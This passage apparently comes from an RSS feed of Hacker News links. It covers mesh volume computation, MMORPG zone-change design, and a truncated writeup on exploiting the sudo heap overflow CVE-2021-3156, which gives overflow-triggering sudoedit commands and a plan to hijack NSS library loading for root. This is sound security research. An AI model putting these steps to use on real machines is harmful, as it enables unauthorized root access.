\Delta_{i2x}) \int_{0}^{1} \int_{0}^{1-u} v dv du</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false" form="postfix">)</mo><mo>+</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="postfix">)</mo><mo>+</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">= T_{i0x} (\frac{1}{2}) + \Delta_{i1x} (\frac{1}{6}) + \Delta_{i2x} (\frac{1}{6})</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><mo>−</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo>−</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">= T_{i0x} (\frac{1}{2}) + (T_{i1x} - T_{i0x})(\frac{1}{6}) + (T_{i2x} - T_{i0x})(\frac{1}{6})</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="false" form="prefix">(</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">= T_{i0x} (\frac{1}{6}) + (T_{i1x})(\frac{1}{6}) + (T_{i2x})(\frac{1}{6})</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo>+</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><mo>+</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">= \frac{1}{6}(T_{i0x} + T_{i1x} + T_{i2x})</annotation></semantics></math></p>
<p>Substituting into the original sum and pulling out a constant factor of <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mfrac><mn>1</mn><mn>6</mn></mfrac><annotation encoding="application/x-tex">\frac{1}{6}</annotation></semantics></math> to avoid the inner loop division, this yields the following compact formula for the volume:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><mfrac><mn>1</mn><mn>6</mn></mfrac><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow></munder><mo stretchy="false" form="prefix">(</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>×</mo><msub><mi>Δ</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><msub><mo stretchy="false" form="postfix">)</mo><mi>x</mi></msub><mo stretchy="false" form="prefix">(</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn><mi>x</mi></mrow></msub><mo>+</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>1</mn><mi>x</mi></mrow></msub><mo>+</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>2</mn><mi>x</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">V = \frac{1}{6} \sum_{i = 0} (\Delta_{i1} \times \Delta_{i2})_x (T_{i0x} + T_{i1x} + T_{i2x})</annotation></semantics></math></p>
<h2 id="performance-analysis">Performance analysis</h2>
<p>The final algorithm contains no numerical integration nor differentiation. In contrast to common naive algorithms for volume, which are equivalent to rendering the mesh and then sampling the render, an expensive operation, there is only a single loop in this algorithm, over the triangles. Thus, this algorithm for volume computation is O(n) to the number of the triangles. Furthermore, the per-triangle calculation is similarly efficient: given the natural expansion of the cross product, the inner part contains seven additions and three multiplications. On the outside of the loop is only a single multiplication. Thus, for a mesh of <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>n</mi><annotation encoding="application/x-tex">n</annotation></semantics></math> triangles, the algorithm requires <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">8n - 1</annotation></semantics></math> additions and <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">3n + 1</annotation></semantics></math> multiplications, or <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">11n</annotation></semantics></math> floating point operations. This is <em>very</em> fast.</p>
<p>For a ballpark number, if volume needs to be calculated every frame in a high-performance 60 frames per second application, without the aid of a GPU, only using the CPU capabilities of a <a href="https://raspberrypi.stackexchange.com/questions/55862/what-is-the-performance-and-the-performance-per-watt-of-raspberry-pi-3-in-gflops">$35 Raspberry Pi</a>, around 30 million triangles could be measured every frame.</p>
<h2 id="motivation">Motivation</h2>
<p>The vector calculus exam is soon, and I need to study. Plus, who doesn’t love 3D graphics?!</p>
<p><del>I would be (pleasantly) surprised if the algorithm is novel.</del> Further research <em>after</em> posting reveals the paper <a href="http://chenlab.ece.cornell.edu/Publication/Cha/icip01_Cha.pdf">Efficient Feature Extraction for 2D/3D Objects in Mesh Representation</a> by Cha Zheng and Tsuhan Chen, which appears to describe the same algorithm, although the derivation is different. It was fun while it lasted!</p>
<p><a href="https://rosenzweig.io/">Back to home</a></p>
</div>]]>
            </description>
            <link>https://rosenzweig.io/blog/hilariously-fast-volume-computation-with-the-divergence-theorem.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25967927</guid>
            <pubDate>Sat, 30 Jan 2021 10:29:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writeup on CVE-2021-3156]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25967407">thread link</a>) | @drug5
<br/>
January 30, 2021 | https://www.kalmarunionen.dk/writeups/sudo/ | <a href="https://web.archive.org/web/*/https://www.kalmarunionen.dk/writeups/sudo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<div>
  <article>
    

    
  

    
    
    <h2>Overview</h2>
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#vulnerability">Vulnerability</a>
      <ul>
        <li><a href="#properties-of-the-overflow">Properties of the overflow</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#heap-grooming">Heap Grooming</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    <p>Writeup by: <a href="https://twitter.com/alexanderkrog">Zanderdk</a></p>
<h2 id="introduction">Introduction</h2>
<p>On the 2021-01-26 qualy released this <a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">article</a> describing a “new” (actually 10 year old) bug in sudo that allows an attacker to do privilege escalation though a heap buffer overflow.
Unfortunately they did not release exploit/POC so I decided to build one myself and failed. It turned out that Pewz from the CTF team bootplug had the same thought and our combined forces allowed us to successfully exploit this bug on the newest libc 2.32 in an arch environment with sudo version 1.9.4p2.</p>
<h2 id="vulnerability">Vulnerability</h2>
<p>I will only briefly cover the vulnerability here as it’s quite well described in the article.</p>
<p>In an essence an attacker can overflow a heap chunk by inserting a single backslash at the end of any argv or env argument given to sudo, causing the following argument to be written out of bound. Let’s look at a simplified version of one of the code snippets from the article.</p>
<div><pre><code data-lang="C"><span>for</span> (size <span>=</span> <span>0</span>, av <span>=</span> NewArgv <span>+</span> <span>1</span>; <span>*</span>av; av<span>++</span>)
  size <span>+=</span> strlen(<span>*</span>av) <span>+</span> <span>1</span>;
...
<span>if</span> (size <span>==</span> <span>0</span> <span>||</span> (user_args <span>=</span> malloc(size)) <span>==</span> NULL) {
  <span>//do some stuff we don't care about
</span><span></span>}
...
<span>for</span> (to <span>=</span> user_args, av <span>=</span> NewArgv <span>+</span> <span>1</span>; (from <span>=</span> <span>*</span>av); av<span>++</span>) {
  <span>while</span> (<span>*</span>from) {
    <span>if</span> (from[<span>0</span>] <span>==</span> <span>'\\'</span> <span>&amp;&amp;</span> <span>!</span>isspace((<span>unsigned</span> <span>char</span>)from[<span>1</span>]))
      from<span>++</span>;
    <span>*</span>to<span>++</span> <span>=</span> <span>*</span>from<span>++</span>;
    }
    <span>*</span>to<span>++</span> <span>=</span> <span>' '</span>;
}
</code></pre></div><p>As we see in the first for loop we are iterating over each argument and finding the size (plus null terminator) of it using <code>strlen</code>. Now lets say we have the string <code>"AAAA\\"</code> (<code>\\</code> is one char).</p>
<p>The size will be 5 and it will only do an allocation of 5 bytes assuming this is the only argument.</p>
<p>In the next part we have a outer for loop over arguments and an inner loop copying the contents of all the arguments into the single buffer, <code>user_args</code>, essentially concatenating all arguments.</p>
<p>Considering the same string as before, <code>"AAAA\\"</code>, when we hit <code>from[0]=='\\'</code> we go into the if and increment <code>from</code> by <code>from++</code>, incrementing <code>from</code> so it points to the null terminator. After that we continue the loop with the next statement <code>*to++ = *from++;</code> copying the null terminator and again incrementing <code>from</code> to continue copying bytes after the null terminator we continue copying out of bounds.</p>
<p>This happens because it expects that every <code>\\</code> is followed by a meta-character, which the authors came up with a clever way of avoiding, leaving this vulnerable to a overflow. Read the article if you want to know why and how we can end up having a single <code>\\</code> in the args when entering this block.</p>
<p>By using the symbolic link <code>sudoedit</code> to <code>sudo</code> we can make this happen:</p>
<p><img src="https://www.kalmarunionen.dk/images/overflow.png" alt="sudo exploit overflowing"></p>
<h3 id="properties-of-the-overflow">Properties of the overflow</h3>
<p>The authors state 3 important properties about this overflow which make it quite powerful.</p>
<p>First and simplest we control the allocation size of <code>user_args</code> as we chose how many and how long we make the arguments to sudo.</p>
<p>Second we control the contents of the overflowed area.
This we can achieve by using the supplied environment variables. The environment variables is infact stored right after the last argument passed to <code>sudoedit</code> meaning that if we do <code>env -i 'A=BBBB' sudoedit -s 'CCCCCCCCCCCCCCCC'</code> we insert the C’s into the user_args buffer and <code>A=BBBB</code> will follow in the out of bounds area. Be aware that chunk size’s align to sizes of 0x10 so e.g. <code>env -i 'A=BB' sudoedit -s 'CCCCBBBBBBBB'</code> will only fill the buffer.</p>
<p>If you paid close attention to the inner loop in our concatenation block you probably noticed that we can exploit this multiple times. By ending a environment variable with <code>\\</code> we can make another skip to the next environment variable. So why would we like that? Because as the <code>from++</code> increments the pointer to the null terminator on the following <code>to++ = *from++;</code> it will insert that null terminator. This makes us able to insert 0x0 as well without ending the overflow making this overflow extremely powerful.</p>
<p>Example from the authors:</p>
<p><code>env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'</code></p>
<p>This will end up like this in the buffer:</p>
<pre><code>--|--------+--------+--------+--------|--------+--------+--------+--------+--
  |        |        |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|
--|--------+--------+--------+--------|--------+--------+--------+--------+--
              size  &lt;---- user_args buffer ----&gt;  size      fd       bk
</code></pre><p>So we wont go into what forward (fd) or backwards (bk) pointers of a heap chunk mean as we are only exploiting in use memory.
Super short and oversimplified description:</p>
<ul>
<li>the first size is the size of the following chunk. It is equal to 0x10 + argument given to malloc as we also need space for size itself and alignment/previous size.</li>
<li>the next size is the contiguous chunks size.</li>
<li>fd and bk are pointers to the next and previous chunk respectively in this linked list of freed chunks. This only applies to freed chunks. Otherwise this space is available to the caller of malloc.</li>
</ul>
<p>If you want to know more about this topic I strongly encourage you to read the <a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">Azeria’s blog about heap exploitation</a>.</p>
<p>Now an important note to make here about the null terminator insertion I think the original paper lacks is that we can insert multiple contiguous null bytes as well.</p>
<p>First thing to understand is that environment variables don’t have to in the form of <code>SOMETHING=something_more</code>. As everything else these are just char arrays and we can do what we can with them in C. as example:</p>
<div><pre><code data-lang="C"><span>char</span> <span>*</span>args[] <span>=</span> { <span>"/usr/bin/sudoedit"</span>, <span>"-s"</span>, <span>"AAAAAAAA"</span>, NULL };
<span>char</span> <span>*</span>env[] <span>=</span> { <span>"BBBBBBBB"</span>, <span>"</span><span>\\</span><span>"</span>, <span>"</span><span>\\</span><span>"</span>, <span>"CCCCCCCC"</span>, NULL };
execve(<span>"/usr/bin/sudoedit"</span>, argv, env);
</code></pre></div><p>Here we are using execve to execute the process with full control of the environment variables.
In the inner for loop we run into the if statement at ´"\\“´ and by that skipping one char by <code>from++</code> the backslash and only inserting the null jumping onto the next ´”\\“´ and consequently inserting two null bytes in a row.</p>
<h2 id="exploitation">Exploitation</h2>
<p>While the authors mention 3 possible targets here in this writeup we will only cover the second one.</p>
<p>Reasons:</p>
<ul>
<li>no brute-force involved in contrast to the first option where they partially overflow a function pointer defeating ASLR with brute-force.</li>
<li>They state that they did it successfully for 3 operating systems where both the other two were only one.</li>
</ul>
<p>In the second option we try to overflow into a <code>service_user</code> struct stored on the heap.</p>
<div><pre><code data-lang="C"><span>typedef</span> <span>struct</span> service_user
{
  <span>/* And the link to the next entry.  */</span>
  <span>struct</span> service_user <span>*</span>next;
  <span>/* Action according to result.  */</span>
  lookup_actions actions[<span>5</span>];
  <span>/* Link to the underlying library object.  */</span>
  service_library <span>*</span>library;
  <span>/* Collection of known functions.  */</span>
  <span>void</span> <span>*</span>known;
  <span>/* Name of the service (`files', `dns', `nis', ...).  */</span>
  <span>char</span> name[<span>0</span>];
} service_user;
</code></pre></div><p>This struct is used in the <code>nss_load_library</code> of libc quite often after the overflow happens for loading new dynamically linked libraries, and can we overflow the name filed then we control what library to load.
Then we can target some non privileged library we can craft that will run with the privileges of root. :-)</p>
<p>The function looks like this:</p>
<div><pre><code data-lang="C"><span>static</span> <span>int</span>
<span>nss_load_library</span> (service_user <span>*</span>ni)
{
  <span>if</span> (ni<span>-&gt;</span>library <span>==</span> NULL)
    {
      <span>static</span> name_database default_table;
      ni<span>-&gt;</span>library <span>=</span> nss_new_service (service_table <span>?:</span> <span>&amp;</span>default_table,
				     ni<span>-&gt;</span>name);
      <span>if</span> (ni<span>-&gt;</span>library <span>==</span> NULL)
	<span>return</span> <span>-</span><span>1</span>;
    }

  <span>if</span> (ni<span>-&gt;</span>library<span>-&gt;</span>lib_handle <span>==</span> NULL)
    {
      <span>/* Load the shared library.  */</span>
      size_t shlen <span>=</span> (<span>7</span> <span>+</span> strlen (ni<span>-&gt;</span>name) <span>+</span> <span>3</span>
		      <span>+</span> strlen (__nss_shlib_revision) <span>+</span> <span>1</span>);
      <span>int</span> saved_errno <span>=</span> errno;
      <span>char</span> shlib_name[shlen];

      <span>/* Construct shared object name.  */</span>
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
					      <span>"libnss_"</span>),
				    ni<span>-&gt;</span>name),
			  <span>".so"</span>),
		__nss_shlib_revision);

      ni<span>-&gt;</span>library<span>-&gt;</span>lib_handle <span>=</span> __libc_dlopen (shlib_name);
      <span>//continue long long function
</span></code></pre></div><p>The goal with this function is to hit the <code>ni-&gt;library-&gt;lib_handle = __libc_dlopen(shlib_name)</code> loading a new library we control.</p>
<p>Here there are two things to be aware of the first the one mentioned in the article.
If <code>ni-&gt;library</code> is not <code>NULL</code> we will use that pointer in the <code>ni-&gt;library-&gt;lib_handle</code> and as ASLR is a bitch we can’t predict a valid pointer without a leak which we don’t have.
Fortunately there is a initial case for this struct where if this is null we set it by <code>ni-&gt;library = nss_new_service (...</code>. Now the multiple null byte write comes in handy!</p>
<p>Then we just need to overflow this struct all the way to it’s name field to change it to an unprivileged library we control.</p>
<p>The second challenge is that we have this next pointer <code>struct service_user *next;</code> inside the struct forming a linked list that will be traversed when the loading happens.
So if we accidentally overflow another <code>service_user</code> struct in the process we will write a garbage pointer if we overflow with fx A’s leading to a seg fault.
This can be circumvented by inserting null bytes in that spot but that creates another problem, we now break the linked list and our target struct could now be completely removed from the list leaving no pointers to it in the entire memory space.</p>
<p>This means that we have to target the first struct in the linked list that comes after our allocated area.
This turned out to be the biggest challenge to overcome as you can imagine this requires pretty good control of the heap allocation.</p>
<p>In the article they target a <code>service_user</code> with the name <code>systemd</code> which we by no means were able to target.
So we set a breakpoint just before the allocation to inspect the linked list. Then we search for <code>systemd</code> and traverse the list backwards until we find the first <code>service_user</code> close to our allocation. (Combined with some trial and error overflowing of A’s to see what struct it crashes on :-))</p>
<p>Here I show the different <code>service_user</code> names in memory and below vmmaps listed in same order. As seen on the picture the second vmmap corresponds to a systemd in the …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kalmarunionen.dk/writeups/sudo/">https://www.kalmarunionen.dk/writeups/sudo/</a></em></p>]]>
            </description>
            <link>https://www.kalmarunionen.dk/writeups/sudo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25967407</guid>
            <pubDate>Sat, 30 Jan 2021 08:39:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build an Mmorpg: Entering and Leaving Zones (2020)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25967242">thread link</a>) | @cipherzero
<br/>
January 30, 2021 | https://www.funkhouse.games/entering-leaving-zones/ | <a href="https://web.archive.org/web/*/https://www.funkhouse.games/entering-leaving-zones/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<h2>Status Update</h2>



<p>It's been a bit since I've posted, but things are chugging along! I keep the Roadmap/Changelog pretty up to date as things are merged into the next release, so keep an eye on those pages if you're curious where we are and haven't seen a post in a while.</p>



<p>I am happy to say that since my last post we have solved a lot of content/client side challenges and have either a working proof of concept or framework in place to handle the following:</p>



<ul><li>Support for non humanoid NPCs</li><li>Ability to switch between zone servers (I.e. "zoning" into a new location) while keeping your character state synchronized in the world.</li><li>Shared wardrobe models that can be used by most, if not all humanoids. These can be mapped to NPCs statically or dynamically rendered based on the equipment being worn.</li></ul>



<div><figure><img src="https://www.funkhouse.games/wp-content/uploads/2020/04/image.png" alt="" srcset="https://www.funkhouse.games/wp-content/uploads/2020/04/image.png 397w, https://www.funkhouse.games/wp-content/uploads/2020/04/image-208x300.png 208w" sizes="(max-width: 397px) 100vw, 397px"><figcaption>Preview of the wardrobe system. In this case, a matching robe &amp; coif are equipped by my player.</figcaption></figure></div>



<p>In the near future I am planning on releasing a simplified version of our framework which handles the mapping/rendering of armor as it is equipped/removed, as well as a way to define an entire wardrobe collection for NPCs regardless of what they have equipped.</p>



<p>Given that we're abstracting the Unity Multipurpose Avatar (a free) plugin, the hope is to share some code that others could copy/reuse to jump start their wardrobe/equipment system. This won't actually integrate with a database, but will give a clear picture on how you could manage/scale for an MMORPG.</p>



<p>I should have the above example ready in just a couple weeks here, but in the meantime.. I'm going to post a quick overview of the challenges we faced when getting a character to switch between zones.</p>



<h2>Synchronization Challenges</h2>



<p>So lets dig into the process of moving a player between zones. If you have been following along with our other posts, you should be aware that the world state is hosted/maintained by a single server.  Then, each zone is hosted by its own independent server, maintaining its own state separate from the world. Therefore, certain state changes which occur on the zone need to be propagated up to the world and vice versa.</p>



<p><em>For the sake of clarity, when referring to the "bind" location of the player, that is the zone, position, and direction they load upon dying (or can teleport to if they are a spell caster).</em></p>



<p>Before this change we did implement one aspect of zoning: reloading upon death. If your character died, the current zone server would persist your bind location as your current location in the database. Then, the character would (in a hard-coded manner) load the same exact zone, but upon load would use the new position which had been persisted by the zone just moments before.</p>



<p>We had built the death event in this way last year in preparation for changing zones. By handling deaths as an actual zone change, we'd hopefully have most of the code ready for when we get to changing between different zones. However, after we tried fitting in movement between two different zones... the issues with our previous design began to show.</p>



<h4>Previous Implementation</h4>



<ol><li>Player dies in the zone</li><li>Zone server creates a corpse and moves all player items/coins to said corpse. Updates position/direction/zone of the player to his or her bind location. These are persisted in the database. </li><li>Zone server alerts connected clients, letting them know of the death</li><li>Player who died contacts zone server to "leave" the zone</li><li>Zone server unloads the player, saving their state in the database.<ul><li>(Alternatively) if the player disconnected, they will be unloaded after a few minutes. At which point, their new state is persisted.</li></ul></li><li>Player requests a new "Zone Change" token from the world server. The <strong>player</strong> was specifying the zone they wanted to connect to in this case. (The zone in which they had died in, because we did not support changing zones yet)</li><li>Player requests to enter the zone for their bind, providing the "Zone Change" token.</li><li>Zone server calls the world server to validate the above token. If valid, the player is loaded from the database into the zone's memory.</li><li>Zone informs all of the connected clients that a player has entered the zone</li><li>Player continues process for loading the zone (terrain/audio/weather assets, each character individually from the zone server, etc.) </li></ol>



<p>Now there are a boatload of issues with the above. To list a few:</p>



<ul><li>The player is specifying the zone they want to go to, rather than simply being told.</li><li>World server wasn't validating whether a zone change is valid for a player. For example, a player who is far away from a portal shouldn't be able to use it to zone. A player shouldn't be able to "hop" 5-6 zones at once unless they happened to be bound there (or were teleported by a wizard/druid).</li><li>The player would leave the current zone before seeing if they could get a "Zone Change" token from the world server. This is OK for deaths, but does not work for normal zone changes. What if the target zone server is down for an extended period? Well, you've already disconnected from your current zone -- and with no zone left to connect to you would crash.</li></ul>



<h4>New Implementation</h4>



<p>So how does the zone change flow actually look like now? Lets look at the death case.</p>



<ol><li>Player dies in a zone</li><li>Zone server creates a corpse and moves all player items/coins to said corpse. Updates position/direction/zone of the player to his or her bind location. These are persisted in the database in case the player crashes.</li><li>Zone server informs the <strong>world server</strong> that the player has died.</li><li>Zone server alerts connected player clients/authoritative client, letting them know of the death.</li><li>Player who died contacts the <strong>world server</strong> first this time, informing the world server that it is requesting a zone change token for a particular reason of death.</li><li>World server checks whether the player is in fact dead (which it learned of in step 3). If true, the world creates a "Simple Zone Change" token and <strong>caches it</strong> locally, along with the player's target zone/location. The target zone host is returned to the player client, so they know which socket servers to connect to next.</li><li>Player calls the <strong>current zone</strong> they're in with the "Simple Zone Change" token to inform them that they're disconnecting.</li><li><strong>Current zone</strong> calls the world server, providing the zone change token, to inform them that the player is now leaving. </li><li>World server uses the zone change token provided from the zone server to lookup the player's target zone / location. The player's state is updated in the world at this point (required for the non death case).</li><li>World server returns back to the zone server an <strong>"Upgraded Zone Change"</strong> token.</li><li>Unless there was a failure validating the token, the zone will finally unload the player -- persisting all changes (except for their zone/position) in the database. Note that this step is required for the <strong>non death case</strong>. Death persistence happens in step 2.</li><li>Zone server returns the "Upgraded Zone Change" token to the player client.</li><li>Player client finally connects to the target zone host that it was provided in step 6, this time providing the "Upgraded Zone Change" token.</li><li>Target zone server calls the world server with the upgraded token. If valid, the world server will inform the player's party/guild members of the zone update, remove the token, and update their state as no longer dead.</li><li>If the target zone server receives back a success from the world, the player is loaded from the database into the zone's memory.</li><li>Zone informs all of the connected clients that a player has entered the zone </li><li>Player continues process for loading the zone (terrain/audio/weather assets, each character individually from the zone server, etc.)</li></ol>



<p>Although this process became a lot more intricate, I was really motivated after seeing cheating programs for EverQuest which would allow you to  instantly zone from any position, as long as the target zone was connected (including bind locations, for example). I wanted to be sure our game servers could authoritatively check that the player is entering a new zone legally, as best I could.</p>



<p>Note that I've primarily discussed the death case, but how do we generically change zones in an authoritative manner?</p>



<p>For this we created a new entity to track throughout servers/clients: "ZoneLinks". A zone link is really just the definition between two zones that are connected, including the position in the world where the links are located as well as other metadata to represent how the player's direction will be calculated after zoning.</p>



<p>Finally, on step 5 of the new flow -- rather than the player requesting a zone change token from the world for a reason of death, the player will request the zone change token for a reason of "ZoneLink". Additionally, the player only provides the zone link ID they are triggering. This allows for the server to decide/enforce which target zone the player will go to, as well as to lookup and see whether the player is truly within range of the zone boundary.</p>



<p>Although not important to the flow, we currently support "Proximity" link triggers on the client and "Clickable" link triggers on the client. A clickable link trigger can be assigned to a GameObject in unity so that whenever clicked it will trigger, whereas a proximity link trigger is simply an invisible game object w/ a collider (triggering when a player walks through it).</p>



<div><figure><img src="https://www.funkhouse.games/wp-content/uploads/2020/04/proximity-zone-link.gif" alt=""><figcaption> Proof of concept / demonstration of proximity based zone links working. (These two zones wont really have a connection) </figcaption></figure></div>



<p>If you look closely in the above, you should be able to see most of the new features we've added since the last post. For example, the NPCs are wearing armor -- and in this case it is a static wardrobe collection for that type of NPC -- whereas the sword they are wielding is coming from is actually equipped.</p>



<p>And with that.. I'll leave you guys until the next update.</p>
<!-- Rate my Post Plugin -->	</div></div>]]>
            </description>
            <link>https://www.funkhouse.games/entering-leaving-zones/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25967242</guid>
            <pubDate>Sat, 30 Jan 2021 08:04:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Subtitles for Language Learning (Prime Video) Chrome Extension]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25966993">thread link</a>) | @matsuu
<br/>
January 29, 2021 | https://www.subtitlesfll.com/en | <a href="https://web.archive.org/web/*/https://www.subtitlesfll.com/en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.subtitlesfll.com/en</link>
            <guid isPermaLink="false">hacker-news-small-sites-25966993</guid>
            <pubDate>Sat, 30 Jan 2021 07:11:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Human-Learn: Draw Machine Learning Models]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25966706">thread link</a>) | @polm23
<br/>
January 29, 2021 | https://koaning.github.io/human-learn/#interactive-drawings | <a href="https://web.archive.org/web/*/https://koaning.github.io/human-learn/#interactive-drawings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
        <div data-md-component="container">
          
            
              
            
            
              
            
          
          <div>
            <article>
              
                
                  <a href="https://github.com/koaning/human-learn/edit/master/docs/index.md" title="Edit this page"></a>
                
                
                <p><img src="https://koaning.github.io/human-learn/logo.png" width="225"></p>

<blockquote>
<p>Machine Learning models should play by the rules, literally.</p>
</blockquote>
<h2 id="project-goal">Project Goal<a href="#project-goal" title="Permanent link">¶</a></h2>
<p>Back in the old days, it was common to write rule-based systems. Systems that do;</p>
<p><img alt="" src="https://koaning.github.io/human-learn/examples/rules.png"></p>
<p>Nowadays, it's much more fashionable to use machine learning instead. Something like;</p>
<p><img alt="" src="https://koaning.github.io/human-learn/examples/ml.png"></p>
<p>We started wondering if we might have lost something in this transition. Sure,
machine learning covers a lot of ground but it is also capable of making bad
decision. We've also reached a stage of hype that folks forget that many
classification problems can be handled by natural intelligence too.</p>
<p>This package contains scikit-learn compatible tools that should make it easier
to construct and benchmark rule based systems that are designed by humans. You
can also use it in combination with ML models.</p>
<h2 id="install">Install<a href="#install" title="Permanent link">¶</a></h2>
<p>You can install this tool via <code>pip</code>.</p>
<div><pre><span></span><code><span>python</span> <span>-</span><span>m</span> <span>pip</span> <span>install</span> <span>human</span><span>-</span><span>learn</span>
</code></pre></div>


<h2 id="guides">Guides<a href="#guides" title="Permanent link">¶</a></h2>
<h3 id="tutorial">Tutorial<a href="#tutorial" title="Permanent link">¶</a></h3>
<blockquote>
<p>There is a full course on this tool available on <a href="https://calmcode.io/human-learn/introduction.html">calmcode.io</a>.
This is the first video.</p>
</blockquote>
<iframe src="https://player.vimeo.com/video/463961716" width="100%" height="460" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>

